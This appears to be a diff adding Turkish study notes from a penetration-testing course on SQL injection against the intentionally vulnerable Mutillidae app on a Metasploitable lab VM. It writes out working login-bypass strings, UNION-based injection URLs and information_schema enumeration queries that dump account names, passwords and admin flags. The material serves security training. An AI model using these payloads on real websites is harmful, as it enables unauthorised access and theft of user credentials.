@@ -1,0 +1,105 @@
+	SQL INJECTION
+ Terminal
+mysql -u root -h 10.0.2.4	-> Metasploitable'a bağlandık.
+show databases;			-> Veritabanlarını göster.
+use owasp10			-> owasp10 veritabanını kullan.
+show tables;			-> Table'ları göster.
+select * from credit_cards;	-> credit_cards veritabanının içeriğini gösterir.
+
+
+
+
+  Mutillidae VERITABANI
+ Metasploitable Sanal Makinemizi açtıktan sonra Kali içerisinde:
+ Firefox
+ 10.0.2.4/
+ Mutillidae > Login/Register > Please register here	-> Bunu yapmamızın amacı veritabanının çalışma durumunu görmek.
+ -> Aldığımız hatayı metasploitable üzerinden düzelteceğiz.
+ -> sudo nano /var/www/mutillidae/config.inc	> passwd: msfadmin
+ -> metasploitable olan yeri owasp10 olarak değiştir.
+
+ Sign > james > 123456
+ Bozmaya çalışalım. :)	-> Şifre yerine ' yaz
+ Hata mesajlarını açıkları bulmak için kullan.
+
+
+
+
+  Açıkları Aramak
+ SELECT * FROM accounts WHERE username='james' AND password='''
+ Şifreyi yazdıktan sonra kod çalıştırmayı deneyebiliriz.
+
+ username='james' AND password='123456' AND 1=2#'
+ Şifre yazma kısmına, 123456' AND 1=1# yazıyoruz. Eğer bu kodu çalıştırabilirsek: Şifremiz doğru ama 1, 2'ye eşit olmadığı için giriş yapılamayacak.
+ 1=1 ile deneseydik 2 öncül de doğru olduğu için giriş yapabilirdik. Yazdığımız kodu gördüğü için bu sitede SQL Açığı var.
+
+
+
+
+  SQL Injection POST Method
+ Bir admin hesabı ile bağlanmaya çalışacağız ve şifreye rastgele bir değer vereceğiz.
+ username = admin AND password = 1234 OR 1=1#'
+ Şifreyi Yanlış girdik ama 1=1 olduğu için hesaba giriş yapabileceğiz çünkü arada OR var ve 2 değer de doğru olmak zorunda değil.
+
+ username = admin'#	-> Yazdıktan sonra şifre bile girmemize gerek kalmayacak çünkü diğer değerleri # ile deaktive ettik.
+
+
+
+
+  SQL Injection GET Method
+ Mutillidae > OWASP Top 10 > A1 - Injection > SQLi - Extract Data > User Info
+ Açılan sitede Kullanıcı adımızı ve Şifremizi girdiğimizde URL Kısmında bütün parametreleri görmekteyiz.
+ Bu URL'yi:		  http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=james&password=123456&user-info-php-submit-button=View+Account+Details
+ Böyle Değiştirdiğimizde: http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=james%27%23&password=123456&user-info-php-submit-button=View+Account+Details
+ O Kullanıcının bilgileri gözükecektir. Bunu admin için de kullanabiliriz.	%23 = #, %27 = ' anlamına geliyor.
+
+
+
+
+  Veritabanındaki Verileri Çalmak [Capture Data from the Database]
+ Eğer linki bu şekilde değiştirirsek o sitede oluşturulan tüm hesapları görebiliriz.
+ http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=james%27%20union%20select%20*%20from%20accounts%23&password=123456&user-info-php-submit-button=View+Account+Details
+
+
+
+
+  Veritabanı İsmini Öğrenmek	[Get the Database Name]
+ Veritabanı ismi, Table ismi, Verileri, Sütun isimlerini vs. Tek tek kendimiz manuel olarak bulup deneyebiliriz.
+
+ 10.0.2.4/mutillidae/index.php?page=user-info.php&username=admin' order by 1%23&password=123456&user-info-php-submit-button=View+Account+Details
+ order by 1 -> 1. Sütun değerini getir. Kaç sütun olduğunu öğrenmek için "order by 1, 2, 3.." deneme yanılma yöntemini kullanacağız.
+ 
+ http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=admin%27%20order%20by%205%23&password=123456&user-info-php-submit-button=View+Account+Details
+ -> 5'ten sonrası çalışmadı yani 5 tane sütunumuz var.
+
+ http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=admin' union select 1, 2, 3, 4, 5%23&password=123456&user-info-php-submit-button=View+Account+Details
+ -> İstediğimiz kullanıcı adının değerlerini verdikten sonra alt sütunda 2, 3, 4 diye değer aldık. Yani 2, 3, 4. sütunlarda bir değer istersek bularbiliriz.
+
+ 10.0.2.4/mutillidae/index.php?page=user-info.php&username=admin' union select 1, database(), user(), version(), 5%23&password=123456&user-info-php-submit-button=View+Account+Details
+ -> İstediğimiz değerlerin çıktısını bize yine alt sütunda verecektir.
+
+
+
+
+  Daha Derinlere İnmek	[Going Deeper]
+ Artık veritabanı ismini biliyoruz. -> owasp10
+ Bu veritabanı içerisindeki table'ları öğrenmeliyiz.
+ 
+ http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=admin%27%20union%20select%201,%20table_name,%20null,%20null,%205%20from%20information_schema.tables%23&password=123456&user-info-php-submit-button=View+Account+Details
+ Getirilen değerlerde "Username=" karşısındaki her değer bir table'ı simgelemektedir.
+ 
+ Sadece 1 tane table'a erişim istiyorsak bunu da filtreleyebiliriz.
+ http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=admin%27%20union%20select%201,%20table_name,%20null,%20null,%205%20from%20information_schema.tables%20where%20table_schema%20=%20%27owasp10%27%23&password=123456&user-info-php-submit-button=View+Account+Details%23&password=123456&user-info-php-submit-button=View+Account+Details
+ -> Owasp10 veritabanı içindeki table isimlerini göster.
+
+
+
+
+  Her Şeyi Ele Geçirmek	[Capture Everything]
+ Column (sütun) isimlerini nasıl buluruz?
+ http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=admin%27%20union%20select%201,%20column_name,%20null,%20null,%205%20from%20information_schema.columns%20where%20table_name%20=%20%27accounts%27%23&password=123456&user-info-php-submit-button=View+Account+Details%23&password=123456&user-info-php-submit-button=View+Account+Details
+ -> Adresine girdiğimizde sütun isimlerini ele geçirmiş olacağız.
+
+ Tüm bilgileri yazdırmak için:
+ http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=admin%27%20union select 1, username, password, is_admin, 5 from accounts%23&password=123456&user-info-php-submit-button=View+Account+Details%23&password=123456&user-info-php-submit-button=View+Account+Details
+ Artık tüm veriler elimizde!
